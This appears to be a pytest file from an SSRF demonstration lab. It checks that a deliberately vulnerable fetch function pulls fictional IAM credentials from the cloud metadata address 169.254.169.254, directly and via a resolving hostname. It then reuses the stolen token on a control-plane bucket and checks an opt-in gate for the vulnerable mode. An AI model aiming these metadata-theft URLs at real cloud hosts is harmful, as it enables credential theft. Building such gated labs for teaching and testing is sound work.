"""Vulnerable-variant behaviour and the opt-in gate.

The vulnerable fetch and HTTP app are exercised in-process inside the `verify` container,
which has the same in-network access as a running vulnerable service, so no separately
started :8001 service is needed to prove the metadata-theft outcomes.
"""

from __future__ import annotations

import json
from pathlib import Path

import httpx
import pytest
from fastapi.testclient import TestClient

from credjack.app.factory import create_app
from credjack.app.fetch import vulnerable_fetch
from credjack.app.gating import VulnerableNotAcknowledged
from credjack.config import SEED_USERS
from credjack.fixtures import data

pytestmark = pytest.mark.topology

AVERY = {"Authorization": f"Bearer {SEED_USERS[0]['token']}"}
DIRECT_IP = "http://169.254.169.254/latest/meta-data/iam/security-credentials/beacon-worker"
RESOLVING_NAME = (
    "http://cdn-edge.partner.test/latest/meta-data/iam/security-credentials/beacon-worker"
)
CONTROL_BUCKET = f"http://{data.CONTROL_NAME}/buckets/{data.BUCKET_NAME}"


def _token(snippet: str) -> str:
    return str(json.loads(snippet)["Token"])


def test_vulnerable_fetch_direct_ip_steals_credentials() -> None:
    outcome = vulnerable_fetch(DIRECT_IP)
    assert outcome.http_status == 200
    assert data.FICTIONAL_SESSION_TOKEN in outcome.body_snippet
    assert "AccessKeyId" in outcome.body_snippet


def test_vulnerable_fetch_resolving_name_steals_credentials() -> None:
    outcome = vulnerable_fetch(RESOLVING_NAME)
    assert outcome.http_status == 200
    assert data.FICTIONAL_SESSION_TOKEN in outcome.body_snippet


def test_stolen_token_unlocks_control_plane_bucket() -> None:
    token = _token(vulnerable_fetch(DIRECT_IP).body_snippet)
    response = httpx.get(CONTROL_BUCKET, headers={"X-Nimbus-Session-Token": token}, timeout=5)
    assert response.status_code == 200
    assert response.content == data.BUCKET_JSON.encode()


def test_vulnerable_app_http_returns_credentials(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> None:
    monkeypatch.setenv("CREDJACK_DB_URL", f"sqlite+pysqlite:///{tmp_path}/v.db")
    monkeypatch.setenv("ALLOW_VULNERABLE_DEMO", "true")
    app = create_app(vulnerable_fetch, title="test-vulnerable", require_ack=True)
    with TestClient(app) as client:
        for url in (DIRECT_IP, RESOLVING_NAME):
            response = client.post("/checks", headers=AVERY, json={"url": url})
            assert response.status_code == 201
            assert data.FICTIONAL_SESSION_TOKEN in response.json()["body_snippet"]


def test_vulnerable_app_refuses_startup_without_ack(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> None:
    monkeypatch.setenv("CREDJACK_DB_URL", f"sqlite+pysqlite:///{tmp_path}/v2.db")
    monkeypatch.delenv("ALLOW_VULNERABLE_DEMO", raising=False)
    app = create_app(vulnerable_fetch, title="test-vulnerable", require_ack=True)
    with pytest.raises(VulnerableNotAcknowledged), TestClient(app):
        pass
